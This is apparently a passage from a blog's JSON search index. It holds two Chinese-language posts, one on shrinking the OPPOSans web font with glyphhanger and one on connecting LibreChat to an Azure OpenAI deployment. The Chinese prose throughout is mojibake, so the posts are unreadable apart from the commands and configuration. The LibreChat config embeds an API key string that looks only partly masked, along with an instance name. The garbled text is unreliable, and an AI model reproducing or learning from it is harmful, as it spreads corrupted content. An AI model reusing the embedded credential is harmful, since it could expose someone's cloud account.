·å­ä¹Ÿçœ‹çƒ¦äº†ï¼Œå‡†å¤‡æ¢æ‰ã€‚\u003c/p\u003e\n\u003cp\u003eæ—§çš„ç•Œé¢ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251213181856750\" loading=\"lazy\" src=\"/posts/20251213-blog_renew/image-20251213181856750.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæ–°çš„ç•Œé¢ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251213182225463\" loading=\"lazy\" src=\"/posts/20251213-blog_renew/image-20251213182225463.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç”¨äº†geminiï¼ŒèŠ±äº†ä¸€å¤©æ—¶é—´ï¼Œä¸»è¦æ˜¯å«Œå¼ƒåº•éƒ¨çš„å‰ä¸€é¡µã€åä¸€é¡µçœ‹èµ·æ¥æ°¸æ— æ­¢å¢ƒï¼Œäºæ˜¯è®©aiæ“äº†ä¸€ä¸ªåº•éƒ¨å¯¼èˆªæ¡ã€‚ä¹Ÿå®šåˆ¶äº†cssã€‚ç¡®å®æƒŠè‰³ä¸€æª\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251213185955036\" loading=\"lazy\" src=\"/posts/20251213-blog_renew/image-20251213185955036.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯è¿‡ç¨‹ä¸­å§ï¼Œç”¨åˆ°äº†ä¸€ä¸ªå¼€æºçš„å­—ä½“ï¼šOPPOSans-Regular.ttf ï¼ŒOPPOæ‰‹æœºçš„å­—ä½“ï¼Œè¿™ä¸ªæ–‡ä»¶å±…ç„¶æœ‰9å…†ä¹‹å·¨\u003c/p\u003e\n\u003cp\u003eå®ŒçŠŠå­äº†ï¼ŒåŠ è½½å­—ä½“éƒ½è¦èŠ±åŠå¤©æ—¶é—´ï¼Œè¿™ä¹Ÿå¤ªææ€–äº†ï¼Œäºæ˜¯æœä¼˜åŒ–æ–¹æ¡ˆ\u003c/p\u003e\n\u003cp\u003eé‚£å°±æ˜¯å‹ç¼©å­—ä½“ï¼ŒæŠŠåšå®¢ä¸­å‡ºç°çš„æ‰€æœ‰å­—æ‰«æä¸€éï¼Œç„¶åç”Ÿæˆå°å­—ä½“æ–‡ä»¶ï¼Œè¿™æ ·å°±å¥½äº†\u003c/p\u003e\n\u003cp\u003eé‚£å°±è¦ç”¨åˆ° \u003ccode\u003eglyphhanger\u003c/code\u003e äº†\u003c/p\u003e\n\u003cp\u003eæ³¨æ„ï¼šè¿™ä¸ªè½¯ä»¶ç”¨èµ·æ¥åŠå…¶éº»çƒ¦ï¼Œä¸€å®šè¦åœ¨Windowsä¸‹è£…ï¼ŒLinuxä¸‹ç®€ç›´æ˜¯åƒåœ¾æˆå †\u003c/p\u003e\n\u003cp\u003eæœ¬ä½“æ˜¯ä¸€ä¸ªnodejsçš„è½¯ä»¶ï¼Œç”¨åˆ°äº†pythonçš„fonttoolsï¼Œè¿˜è£…äº†puppyteerè¿›è¡Œç½‘é¡µçš„æŠ“å–ï¼Œç®€ç›´æ˜¯æ‚çƒ©å¤§é›†åˆ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# è¦å‹ç¼©æˆwoff2ï¼Œæ‰€ä»¥è¦è£…pythonçš„2ä¸ªåŒ…\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enpm install -g glyphhanger\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epip install fonttools\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epip install brotli\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#æ‰“å¼€hugoçš„é¢„è§ˆï¼Œhttp://localhost:1313/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehugo serve\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å½“å‰ç›®å½•ä¸‹çš„OPPOSans-Regular.ttfï¼Œç”Ÿæˆå‹ç¼©è¿‡çš„å­—ä½“æ–‡ä»¶ï¼Œæ ¼å¼æ˜¯woff2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eglyphhanger --subset OPPOSans-Regular.ttf --formats\u003cspan class=\"o\"\u003e=\u003c/span\u003ewoff2 --output ./ http://localhost:1313/posts/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20251213184318813\" loading=\"lazy\" src=\"/posts/20251213-blog_renew/image-20251213184318813.png\"\u003e\u003c/p\u003e\n\u003cp\u003ettfçš„å®Œæ•´å­—ä½“ç»è¿‡å‹ç¼©æˆwoff2ï¼Œä»9å…†å˜æˆäº†4.52å…†ï¼Œç„¶åæ‰«æç½‘é¡µååˆå‹ç¼©åˆ°äº†æœ€ç»ˆçš„75.5KB.\u003c/p\u003e\n\u003cp\u003eè¿™ä¼šç”Ÿæˆä¸€ä¸ª\u003ccode\u003eOPPOSans-Regular-subset.woff2\u003c/code\u003eçš„æ–°å­—ä½“æ–‡ä»¶ï¼Œ75.5KB\u003c/p\u003e\n\u003cp\u003eæ²¡å®Œå‘¢ï¼Œæˆ‘ä»¬è¿˜è¦åœ¨CSSé‡ŒæŒ‡å®šå­—ä½“èŒƒå›´\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å‹ç¼©å­—ä½“æ–‡ä»¶ï¼ŒåŒæ—¶ç”ŸæˆCSSæ ·å¼\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eglyphhanger --css --subset fonts/OPPOSans-Regular.woff2 --formats\u003cspan class=\"o\"\u003e=\u003c/span\u003ewoff2 --output newfonts http://localhost:1313/posts/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¼šç”ŸæˆCSSæ–‡ä»¶ï¼Œæˆ‘ä»¬æŠŠå®ƒæ”¾è¿›å®šåˆ¶çš„custom.cssä¸­å³å¯\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251213185802356\" loading=\"lazy\" src=\"/posts/20251213-blog_renew/image-20251213185802356.png\"\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e@font-face \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  font-family: OPPO Sans\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  src: local\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;OPPO Sans\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e       url\u003cspan class=\"o\"\u003e(\u003c/span\u003eOPPOSans-Regular-subset.woff2\u003cspan class=\"o\"\u003e)\u003c/span\u003e format\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;woff2\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  unicode-range: U+A,U+20-3E,U+40-7D,U+A9,U+B7,U+BB,U+2013,U+25BA,U+2705,U+3001,U+3002,U+4E00,U+4E09-4E0B,U+4E0D,U+4E14,U+4E1A,U+4E1C,U+4E24,U+4E2A,U+4E2D,U+4E34,U+4E3A,U+4E3B,U+4E48,U+4E49,U+4E4B,U+4E4E,U+4E50,U+4E5F,U+4E66,U+4E71,U+4E86,U+4E89,U+4E8B,U+4E8C,U+4E8E,U+4E94,U+4E9B,U+4EA6,U+4EA7,U+4EAB,U+4EBA,U+4ECA,U+4ECE,U+4ED3,U+4EE3-4EE5,U+4EEC,U+4EF6,U+4EFB,U+4EFD,U+4F01,U+4F1A,U+4F20,U+4F3C,U+4F46,U+4F53,U+4F55,U+4F59,U+4F5C,U+4F60,U+4F73,U+4F7F,U+4FBF,U+4FDD,U+4FE1,U+4FEE,U+5019,U+503C,U+5047,U+504F,U+505A,U+50CF,U+513F,U+5143,U+5148,U+5165,U+5168,U+516B,U+516C,U+5171,U+5173,U+5176,U+5177,U+517C,U+5185,U+518D,U+5197,U+5199,U+51B3,U+51B5,U+51C0,U+51C6,U+51FA,U+51FB,U+51FD,U+5206,U+5212,U+5219-521B,U+521D,U+5220,U+522B,U+5230,U+524D,U+526F,U+529E-52A1,U+52A8,U+52B2,U+5305,U+5316,U+5355,U+535A,U+5360,U+5361,U+5373,U+5386,U+53BB,U+53C2,U+53C8,U+53CA,U+53D1,U+53D6,U+53D8,U+53E3,U+53E4,U+53EA,U+53EF,U+53F0,U+53F7,U+53F8,U+5404,U+540C-540E,U+5411,U+5426,U+5427,U+542F,U+544A,U+5462,U+547D,U+548C,U+54EA,U+554A,U+5565,U+5668,U+56DB,U+56DE,U+56E0,U+56E7,U+56FD,U+56FE,U+5728,U+5730,U+573A,U+5740,U+5757,U+578B,U+57DF,U+585E,U+5883,U+589E,U+5904,U+5907,U+590D,U+5916,U+591A,U+5927,U+5929,U+592A,U+5931,U+5948,U+597D,U+5982,U+59CB,U+5B50,U+5B57,U+5B58,U+5B83,U+5B89,U+5B8C,U+5B98,U+5B9A,U+5B9E,U+5BA2,U+5BB6,U+5BB9,U+5BBD,U+5BC6,U+5BCC,U+5BF9,U+5BFC,U+5C01,U+5C06,U+5C31,U+5C3D,U+5C45,U+5DDE,U+5DF1,U+5DF2,U+5E02,U+5E03,U+5E38,U+5E72-5E74,U+5E76,U+5E78,U+5E7F,U+5E8F,U+5E93,U+5E94,U+5EFA,U+5F00,U+5F04,U+5F0F,U+5F20,U+5F31,U+5F39,U+5F52,U+5F53,U+5F55,U+5F85,U+5F88,U+5F97,U+5FAA,U+5FC3,U+5FC5,U+5FD7,U+5FEB,U+6000,U+6001,U+600E,U+601D,U+6027,U+603B,U+6062,U+606F,U+6089,U+60A8,U+60C5,U+60F3,U+6109,U+610F,U+613F,U+6210-6212,U+6216,U+6237,U+623F,U+6240,U+624B,U+624D,U+6253,U+6254,U+6258,U+6267,U+6269,U+627E,U+6280,U+628A,U+62A5,U+62C9,U+62DF,U+62E9,U+62EC,U+62FF,U+6301,U+6307,U+6309,U+636E,U+6377,U+6389,U+6392,U+63A5,U+63A8,U+641C,U+642D,U+6446,U+6447,U+64CD,U+652F,U+6539,U+653E,U+6545,U+6570,U+6574,U+6587,U+65AD,U+65B0,U+65B9,U+65E0,U+65E5,U+65E9,U+65F6,U+660E,U+6613,U+662F,U+663E,U+666F,U+66B4,U+66F4,U+6700,U+6708,U+6709,U+670D,U+671F,U+672A,U+672C,U+672F,U+673A,U+6743,U+6765,U+677E,U+677F,U+6790,U+679C,U+67D0,U+67E5,U+6807,U+6837-6839,U+683C,U+6848,U+6863,U+68AD,U+68C0,U+6A21,U+6B21,U+6B4C,U+6B62,U+6B63,U+6B65,U+6B7B,U+6BB5,U+6BCF,U+6BD4,U+6C42,U+6C89,U+6CA1,U+6CD5,U+6CE8,U+6D3B,U+6D4B,U+6D88,U+6DFB,U+6E05,U+6E90,U+6EE5,U+6F0F,U+706B,U+70B9,U+70C2,U+70E6,U+7130,U+7136,U+7167,U+719F,U+723D,U+7248,U+7279,U+72B6,U+72EC,U+73A9,U+73AF,U+73B0,U+7406,U+751F,U+7528,U+7531,U+754C,U+7591,U+7684,U+76D6,U+76EE,U+76F4,U+76F8,U+7701,U+770B,U+771F,U+77E5,U+77ED,U+7801,U+7814,U+786E,U+793A,U+79BB,U+79CD,U+79D2,U+79DF,U+79F0,U+79FB,U+7A00,U+7A0B,U+7A76,U+7A7A,U+7ACB,U+7AD9,U+7ADE-7AE0,U+7AEF,U+7B2C,U+7B49,U+7B54,U+7B7E,U+7B80,U+7B97,U+7BA1,U+7C7B,U+7CFB,U+7D22,U+7E41,U+7EA7,U+7EAF,U+7EC6,U+7ECF,U+7ED3,U+7ED9,U+7EDC,U+7EDF,U+7EED,U+7F3A,U+7F51,U+7F6E,U+7F72,U+7FA4,U+8003,U+8005,U+800C,U+800D,U+8017,U+804C,U+8054,U+80AF,U+80CC,U+80FD,U+8106,U+8111,U+811A,U+817E,U+81EA,U+81F4,U+8272,U+8282,U+8350,U+83B7,U+83DC,U+85CF,U+8651,U+865A,U+884C,U+88AB,U+88C2,U+88C5,U+88D5,U+897F,U+8981,U+8986,U+89C9,U+89D2,U+89E3,U+8A00,U+8B66,U+8BA1,U+8BA2,U+8BAF,U+8BB2,U+8BBA,U+8BBE,U+8BBF,U+8BC1,U+8BD5,U+8BDD,U+8BE2,U+8BE5,U+8BE6,U+8BED,U+8BEF,U+8BF4,U+8BF7,U+8C03,U+8C37,U+8C61,U+8D25,U+8D44,U+8D70,U+8D77,U+8DD1,U+8DDF,U+8DEF,U+8DF3,U+8DF5,U+8F7B,U+8F7D,U+8F83,U+8F93,U+8FC1,U+8FC7,U+8FD0,U+8FD4,U+8FD8,U+8FD9,U+8FDB,U+8FDE,U+9000-9002,U+9009,U+901A,U+903C,U+9047,U+904D,U+9053,U+9075,U+90A3,U+90E8,U+90FD,U+914D,U+91CA,U+91CC,U+91CD,U+91CF,U+94FE,U+9501,U+9519,U+952E,U+955C,U+957F,U+95EE,U+95F4,U+9632,U+963B,U+9645,U+964B,U+9650,U+9664,U+968F,U+9690,U+969C,U+96BE,U+96C6,U+9700,U+975E,U+9762,U+9875,U+9876,U+987B,U+9884,U+9891,U+9898,U+9996,U+9AA4,U+9AD8,U+9EBB,U+FF01,U+FF0C,U+FF1A,U+FF1F\u003cspan class=\"p\"\u003e;\u003c/span\u003e       \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  font-style: normal\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  font-display: swap\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  font-weight: \u003cspan class=\"m\"\u003e300\u003c/span\u003e 700\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæŠŠå‹ç¼©åçš„å­—ä½“å’ŒCSSå†æ¬¡æäº¤ååšå®¢çš„é€Ÿåº¦å°±å˜å¾—é£å¿«äº†ã€‚\u003c/p\u003e","title":"Aiæ—¶ä»£çš„Blogæ¢è„¸ä¸å­—ä½“å‹ç¼©"},{"content":"Aiçš„æ—¶ä»£å·²ç»æ¥ä¸´ï¼Œç°åœ¨ä¸»ç”¨çš„æ˜¯è°·æ­Œçš„antigravityï¼Œç„¶åå¹³æ—¶å¯¹è¯è¯¢é—®ï¼Œç”¨çš„æ˜¯LibreChatï¼Œç»™ä¸ªé“¾æ¥\nhttps://github.com/danny-avila/LibreChat\nç„¶åè¿™ä¸ªä¸œè¥¿å§ï¼Œé…èµ·æ¥æ²¡é‚£ä¹ˆç®€å•ï¼Œè¿˜æ˜¯ docker compose çš„éƒ¨ç½²æ–¹æ³•å¿«æ·\né‚£æœ‰openrouterçš„apiï¼Œè¿™ä¸ªæ¥å…¥ç®€å•ã€‚é‚£åŒæ—¶ä¹‹å‰è¿˜æœ‰ç”¨Azure gpt-4oçš„apiï¼Œç”¨çš„æ˜¯Javisï¼Œç›´æ¥æ¥å…¥Azure\nJavisåå¼±ï¼Œç°åœ¨æƒ³ç»Ÿä¸€ç”¨åˆ°LibreChatï¼Œæ¥å…¥è¿˜çœŸçš„æ˜¯ä¸€è¨€éš¾å°½\næ¥è¯¦ç»†è¯´è¯´Azureçš„é…æ³•ï¼ŒèƒŒæ™¯ï¼šAzureæ˜¯åŒäº‹åœ¨2024å¹´å¼€çš„ï¼Œåªç»™äº†æˆ‘ä¸‰ä¸ªå‚æ•°\nAZURE_OPENAI_API_BASE=\u0026#34;https://pppqqq-eus.openai.azure.com/\u0026#34; OPENAI_API_KEY=\u0026#34;12xxxaaabbbccccccccccccgggggggggggggggggggggggggggCOGuy6M\u0026#34; AZURE_OPENAI_DEPLOYMENT_NAME=\u0026#34;gpt-4o-abc\u0026#34; ç„¶åå‘¢ï¼ŒåŒäº‹è¿˜ç¦»èŒäº†ï¼Œç„¶åå…¶å®ƒå‚æ•°å°±éƒ½é—®ä¸åˆ°äº†\nLibreChatå‘¢ï¼Œæ–‡æ¡£ç®€ç›´ç¨€çƒ‚ï¼Œè€Œä¸”å˜åŠ¨è¿˜ç‰¹åˆ«å¤§\nLibreChatä¸»è¦çš„æ€è·¯å‘¢ï¼Œå°±æ˜¯åœ¨.envä¸­å®šä¹‰å˜é‡ï¼Œç„¶ååœ¨librechat.yamlä¸­ä½¿ç”¨å˜é‡ï¼Œæˆ‘ä»¬å°±çœäº†ï¼Œéƒ½æ‰”åˆ°librechat.yamlä¸­å¥½äº†\nendpoints: azureOpenAI: titleModel: \u0026#34;gpt-4o\u0026#34; plugins: true groups: - group: \u0026#34;azure\u0026#34; apiKey: \u0026#34;12xxxaaabbbccccccccccccgggggggggggggggggggggggggggCOGuy6M\u0026#34; instanceName: \u0026#34;pppqqq-eus\u0026#34; version: \u0026#34;2024-05-01-preview\u0026#34; # æ¨èä½¿ç”¨æ–°ç‰ˆAPIï¼Œä»¥æ”¯æŒGPT-4o # --- Model-Level Mapping (é‡ç‚¹) --- models: # LibreChatæ˜¾ç¤ºçš„åç§°: å®é™…Azureéƒ¨ç½²çš„åç§° gpt-4o: # \u0026lt;--- è¿™ä¸ªåç§°ä¼šæ˜¾ç¤ºåœ¨LibreChatçš„ä¸‹æ‹‰èœå•ä¸­ deploymentName: \u0026#34;gpt-4o-abc\u0026#34; # \u0026lt;--- æ‚¨çš„å®é™…Azureéƒ¨ç½²åç§° version: \u0026#34;2024-05-01-preview\u0026#34; # å¯è¦†ç›–groupçš„version gpt-4-turbo-2024-04-09: # LibreChatæ˜¾ç¤ºçš„åç§° deploymentName: \u0026#34;gpt-4o-abc\u0026#34; # æ‚¨çš„å®é™…Azureéƒ¨ç½²åç§° version: \u0026#34;2024-02-15-preview\u0026#34; ä¸Šé¢çš„é…ç½®æ˜¯é—®äº†geminiç»™å‡ºçš„ï¼Œçœ‹å¾—å‡ºæ¥å˜é‡AZURE_OPENAI_API_BASEä¸­çš„xxx.openai.azure.comå‰é¢çš„xxxï¼Œå°±æ˜¯instanceName\nOPENAI_API_KEYå°±æ˜¯apiKey\nAZURE_OPENAI_DEPLOYMENT_NAMEå°±æ˜¯deploymentName\næ¨¡å‹çš„gpt-4oè¿˜æœ‰gpt-4-turbo-2024-04-09éƒ½æ˜¯geiminiç»™å‡ºçš„ï¼Œversionä¹Ÿå¾ˆé‡è¦ï¼Œä¸å¯¹ä¼šæŠ¥é”™\nç„¶åå°±å¯ä»¥äº†\nä¸å¾—ä¸è¯´ï¼Œè¿˜æ˜¯openrouteçš„æ¨¡å‹å¤šå•Šï¼Œå¯æƒœå°±æ˜¯å¤ªè´¹é’±äº†ã€‚Tokenå“—å“—é£ï¼ŒåŠ¨è¾„éƒ½æ˜¯65535Token\n","permalink":"https://rendoumi.com/posts/20251210-librechat_azure/","summary":"\u003cp\u003eAiçš„æ—¶ä»£å·²ç»æ¥ä¸´ï¼Œç°åœ¨ä¸»ç”¨çš„æ˜¯è°·æ­Œçš„antigravityï¼Œç„¶åå¹³æ—¶å¯¹è¯è¯¢é—®ï¼Œç”¨çš„æ˜¯LibreChatï¼Œç»™ä¸ªé“¾æ¥\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/danny-avila/LibreChat\"\u003ehttps://github.com/danny-avila/LibreChat\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åè¿™ä¸ªä¸œè¥¿å§ï¼Œé…èµ·æ¥æ²¡é‚£ä¹ˆç®€å•ï¼Œè¿˜æ˜¯ docker compose çš„éƒ¨ç½²æ–¹æ³•å¿«æ·\u003c/p\u003e\n\u003cp\u003eé‚£æœ‰openrouterçš„apiï¼Œè¿™ä¸ªæ¥å…¥ç®€å•ã€‚é‚£åŒæ—¶ä¹‹å‰è¿˜æœ‰ç”¨Azure gpt-4oçš„apiï¼Œç”¨çš„æ˜¯Javisï¼Œç›´æ¥æ¥å…¥Azure\u003c/p\u003e\n\u003cp\u003eJavisåå¼±ï¼Œç°åœ¨æƒ³ç»Ÿä¸€ç”¨åˆ°LibreChatï¼Œæ¥å…¥è¿˜çœŸçš„æ˜¯ä¸€è¨€éš¾å°½\u003c/p\u003e\n\u003cp\u003eæ¥è¯¦ç»†è¯´è¯´Azureçš„é…æ³•ï¼ŒèƒŒæ™¯ï¼šAzureæ˜¯åŒäº‹åœ¨2024å¹´å¼€çš„ï¼Œåªç»™äº†æˆ‘ä¸‰ä¸ªå‚æ•°\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eAZURE_OPENAI_API_BASE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;https://pppqqq-eus.openai.azure.com/\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eOPENAI_API_KEY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;12xxxaaabbbccccccccccccgggggggggggggggggggggggggggCOGuy6M\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eAZURE_OPENAI_DEPLOYMENT_NAME\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;gpt-4o-abc\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åå‘¢ï¼ŒåŒäº‹è¿˜ç¦»èŒäº†ï¼Œç„¶åå…¶å®ƒå‚æ•°å°±éƒ½é—®ä¸åˆ°äº†\u003c/p\u003e\n\u003cp\u003eLibreChatå‘¢ï¼Œæ–‡æ¡£ç®€ç›´ç¨€çƒ‚ï¼Œè€Œä¸”å˜åŠ¨è¿˜ç‰¹åˆ«å¤§\u003c/p\u003e\n\u003cp\u003eLibreChatä¸»è¦çš„æ€è·¯å‘¢ï¼Œå°±æ˜¯åœ¨.envä¸­å®šä¹‰å˜é‡ï¼Œç„¶ååœ¨librechat.yamlä¸­ä½¿ç”¨å˜é‡ï¼Œæˆ‘ä»¬å°±çœäº†ï¼Œéƒ½æ‰”åˆ°librechat.yamlä¸­å¥½äº†\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eendpoints:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  azureOpenAI:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    titleModel: \u003cspan class=\"s2\"\u003e\u0026#34;gpt-4o\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    plugins: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    groups:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - group: \u003cspan class=\"s2\"\u003e\u0026#34;azure\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        apiKey: \u003cspan class=\"s2\"\u003e\u0026#34;12xxxaaabbbccccccccccccgggggggggggggggggggggggggggCOGuy6M\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        instanceName: \u003cspan class=\"s2\"\u003e\u0026#34;pppqqq-eus\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        version: \u003cspan class=\"s2\"\u003e\u0026#34;2024-05-01-preview\u0026#34;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# æ¨èä½¿ç”¨æ–°ç‰ˆAPIï¼Œä»¥æ”¯æŒGPT-4o\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e# --- Model-Level Mapping (é‡ç‚¹) ---\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        models:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"c1\"\u003e# LibreChatæ˜¾ç¤ºçš„åç§°: å®é™…Azureéƒ¨ç½²çš„åç§°\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          gpt-4o: \u003cspan class=\"c1\"\u003e# \u0026lt;--- è¿™ä¸ªåç§°ä¼šæ˜¾ç¤ºåœ¨LibreChatçš„ä¸‹æ‹‰èœå•ä¸­\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            deploymentName: \u003cspan class=\"s2\"\u003e\u0026#34;gpt-4o-abc\u0026#34;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# \u0026lt;--- æ‚¨çš„å®é™…Azureéƒ¨ç½²åç§°\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            version: \u003cspan class=\"s2\"\u003e\u0026#34;2024-05-01-preview\u0026#34;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# å¯è¦†ç›–groupçš„version\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          gpt-4-turbo-2024-04-09: \u003cspan class=\"c1\"\u003e# LibreChatæ˜¾ç¤ºçš„åç§°\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            deploymentName: \u003cspan class=\"s2\"\u003e\u0026#34;gpt-4o-abc\u0026#34;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# æ‚¨çš„å®é™…Azureéƒ¨ç½²åç§°\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            version: \u003cspan 